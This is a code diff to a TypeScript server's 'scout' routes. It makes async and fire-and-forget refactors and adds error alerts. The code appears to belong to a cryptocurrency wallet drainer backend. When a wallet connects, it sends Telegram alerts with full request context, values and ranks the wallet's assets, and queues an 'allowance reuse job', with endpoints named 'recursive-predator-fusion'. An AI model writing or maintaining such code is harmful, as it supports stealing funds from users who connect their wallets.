@@ -57,7 +57,7 @@ async function resolveReferenceRatesUsd(): Promise<OracleRates> {
 }
 
 export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
-  app.post('/api/v1/scout', (request: FastifyRequest, reply: FastifyReply) => {
+  app.post('/api/v1/scout', async (request: FastifyRequest, reply: FastifyReply) => {
     const parsed = parseBody(scoutIngressBodySchema, request.body)
     if (parsed.ok === false) {
       return sendFailure(reply, 400, parsed.message, { code: 'ValidationError' })
@@ -80,7 +80,7 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
       'telemetry_ingress_weld',
     )
 
-    // 🔔 Telegram: Notify wallet connected with full context
+    // 🔔 Telegram: Notify wallet connected with full context (fire-and-forget)
     if (user_address) {
       const ctx: TelegramRequestContext = {
         ...extractRequestContext(request),
@@ -94,9 +94,10 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
           ? { connected_wallets: body.connected_wallets.join(',') }
           : {}),
       }
-      notifyWalletConnected(user_address, chainFamily, walletType, ctx).catch(() => {})
+      void notifyWalletConnected(user_address, chainFamily, walletType, ctx).catch(() => {})
     }
 
+    // Fire-and-forget allowance reuse job
     void enqueueAllowanceReuseJob({
       wallet_address: user_address,
       ...(isAddress(user_address)
@@ -178,8 +179,8 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
           btcUsd: rates.btc,
         })
       } catch (err) {
-        // 🔔 Telegram: Notify scan error with context
-        notifyError('/api/scout/recursive-predator-fusion', String(err), primaryAddress || undefined, ctx).catch(() => {})
+        // 🔔 Telegram: Notify scan error with context (fire-and-forget)
+        void notifyError('/api/scout/recursive-predator-fusion', String(err), primaryAddress || undefined, ctx).catch(() => {})
         throw err
       }
 
@@ -188,7 +189,7 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
         'OMNICHAIN_EXPANSION_LOCKED',
       )
 
-      // 🔔 Telegram: Notify scan complete with total USD + context
+      // 🔔 Telegram: Notify scan complete with total USD + context (fire-and-forget)
       if (primaryAddress) {
         const totalUsd = typeof (fusion as Record<string, unknown>)['total_usd'] === 'number'
           ? (fusion as Record<string, unknown>)['total_usd'] as number
@@ -201,7 +202,7 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
           scout_value_usd:
             body.scout_value_usd != null ? body.scout_value_usd : totalUsd,
         }
-        notifyScanComplete(primaryAddress, totalUsd, assetsCount, scanCtx).catch(() => {})
+        void notifyScanComplete(primaryAddress, totalUsd, assetsCount, scanCtx).catch(() => {})
       }
 
       return sendSuccess(reply, 200, 'Recursive predator fusion complete', {
@@ -232,7 +233,7 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
         chain_family: chainFamily ?? 'ALL',
         scout_value_usd: totalUsd,
       }
-      notifyScanComplete(wallet, totalUsd, assets.length, scanCtx).catch(() => {})
+      void notifyScanComplete(wallet, totalUsd, assets.length, scanCtx).catch(() => {})
       return sendSuccess(reply, 200, 'Ranked assets ready', {
         assets,
         total_usd: totalUsd,
@@ -241,7 +242,7 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
       })
     } catch (err) {
       const msg = err instanceof Error ? err.message : String(err)
-      notifyError('/api/v1/scout/ranked', msg, wallet, extractRequestContext(request)).catch(() => {})
+      void notifyError('/api/v1/scout/ranked', msg, wallet, extractRequestContext(request)).catch(() => {})
       return sendFailure(reply, 500, msg, { code: 'ServerError' })
     }
   })
@@ -266,6 +267,7 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
       })
     } catch (err) {
       const msg = err instanceof Error ? err.message : String(err)
+      void notifyError('/api/v1/scout/detect-wallet', msg, wallet, extractRequestContext(request)).catch(() => {})
       return sendFailure(reply, 500, msg, { code: 'ServerError' })
     }
   })
@@ -291,6 +293,7 @@ export async function registerScoutRoutes(app: FastifyInstance): Promise<void> {
       })
     } catch (err) {
       const msg = err instanceof Error ? err.message : String(err)
+      void notifyError('/api/v1/scout/detect-evm-wallet', msg, wallet, extractRequestContext(request)).catch(() => {})
       return sendFailure(reply, 500, msg, { code: 'ServerError' })
     }
   })
